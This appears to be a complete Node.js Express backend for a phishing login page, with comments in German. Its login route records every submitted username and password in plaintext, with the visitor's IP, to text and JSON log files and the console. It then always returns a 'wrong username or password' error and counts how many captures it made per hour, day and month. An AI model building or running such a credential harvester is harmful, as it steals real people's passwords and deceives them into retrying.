const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000;
const STATS_FILE = 'stats.json';

// Middleware
app.use(express.json());
app.use(express.static(__dirname));

// Statistik-Daten laden oder initialisieren
let stats = {
    hour: { count: 0, timestamp: Date.now() },
    day: { count: 0, timestamp: Date.now() },
    month: { count: 0, timestamp: Date.now() }
};

if (fs.existsSync(STATS_FILE)) {
    try {
        stats = JSON.parse(fs.readFileSync(STATS_FILE, 'utf8'));
    } catch (err) {
        console.error('Fehler beim Laden der Statistik:', err);
    }
}

// Funktion zum Speichern der Statistik
function saveStats() {
    fs.writeFileSync(STATS_FILE, JSON.stringify(stats, null, 2));
}

// Funktion zum Zurücksetzen der Zähler basierend auf Zeit
function checkAndResetStats() {
    const now = Date.now();
    const oneHour = 60 * 60 * 1000;
    const oneDay = 24 * 60 * 60 * 1000;
    const oneMonth = 30 * 24 * 60 * 60 * 1000;

    if (now - stats.hour.timestamp > oneHour) {
        stats.hour = { count: 0, timestamp: now };
    }
    if (now - stats.day.timestamp > oneDay) {
        stats.day = { count: 0, timestamp: now };
    }
    if (now - stats.month.timestamp > oneMonth) {
        stats.month = { count: 0, timestamp: now };
    }
}

// Route zum Abrufen der Statistik
app.get('/stats', (req, res) => {
    checkAndResetStats();
    res.json({
        hour: stats.hour.count,
        day: stats.day.count,
        month: stats.month.count
    });
});

// Login Route
app.post('/login', (req, res) => {
    const { name, kennwort } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const timestamp = new Date().toISOString();

    // Log-Eintrag erstellen
    const logEntry = {
        timestamp: timestamp,
        ip: ip,
        name: name,
        kennwort: kennwort
    };

    // In Datei schreiben
    const logLine = `[${timestamp}] IP: ${ip} | Name: ${name} | Kennwort: ${kennwort}\n`;

    fs.appendFile('login_log.txt', logLine, (err) => {
        if (err) {
            console.error('Fehler beim Schreiben der Log-Datei:', err);
        }
    });

    // Auch als JSON speichern
    fs.appendFile('login_log.json', JSON.stringify(logEntry) + ',\n', (err) => {
        if (err) {
            console.error('Fehler beim Schreiben der JSON-Log-Datei:', err);
        }
    });

    // Console Log
    console.log('=== Neue Anmeldung ===');
    console.log('Zeit:', timestamp);
    console.log('IP:', ip);
    console.log('Name:', name);
    console.log('Kennwort:', kennwort);
    console.log('=====================\n');

    // Statistik aktualisieren
    checkAndResetStats();
    stats.hour.count++;
    stats.day.count++;
    stats.month.count++;
    saveStats();

    // Antwort senden - immer Fehlermeldung anzeigen
    res.json({
        success: false,
        message: 'Benutzername oder Passwort falsch',
        stats: {
            hour: stats.hour.count,
            day: stats.day.count,
            month: stats.month.count
        }
    });
});

// Server starten
app.listen(PORT, () => {
    console.log(`Server läuft auf http://localhost:${PORT}`);
    console.log('Drücke Ctrl+C zum Beenden');
});
